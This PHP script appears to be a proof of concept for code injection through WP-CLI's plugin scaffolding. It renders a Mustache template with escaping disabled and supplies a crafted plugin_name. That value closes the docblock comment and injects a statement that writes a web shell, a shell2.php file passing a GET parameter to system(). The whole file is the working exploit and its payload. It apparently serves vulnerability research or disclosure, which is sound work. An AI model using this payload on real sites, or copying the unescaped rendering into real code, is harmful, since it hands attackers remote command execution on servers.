<?php
require __DIR__ . '/vendor/autoload.php';
use Mustache\Engine as Mustache_Engine;

function mustache_render( $template_name, $data = [] ) {
    $template = (string) file_get_contents( $template_name );
    $mustache = new Mustache_Engine([ 'escape' => function ( $val ) { return $val; } ]);
    return $mustache->render( $template, $data );
}

// Malicious --plugin_name value an operator/automation could pass to `wp scaffold plugin`.
// Breaks out of the docblock comment via `*/`, injects a real top-level PHP statement,
// then reopens a comment with `/*` to swallow the rest of the header harmlessly.
$payload = "Evil */ file_put_contents(__DIR__.'/shell2.php', '<?php system(\$_GET[\"c\"]); '); /*";

$data = [
    'plugin_name'         => $payload,
    'plugin_uri'          => 'PLUGIN SITE HERE',
    'plugin_description'  => 'PLUGIN DESCRIPTION HERE',
    'plugin_author'       => 'YOUR NAME HERE',
    'plugin_author_uri'   => 'YOUR SITE HERE',
    'textdomain'          => 'sample-plugin',
    'plugin_package'      => 'Sample_Plugin',
];

$out = mustache_render( __DIR__ . '/plugin.mustache', $data );
file_put_contents( __DIR__ . '/sample-plugin.php', $out );
echo $out;
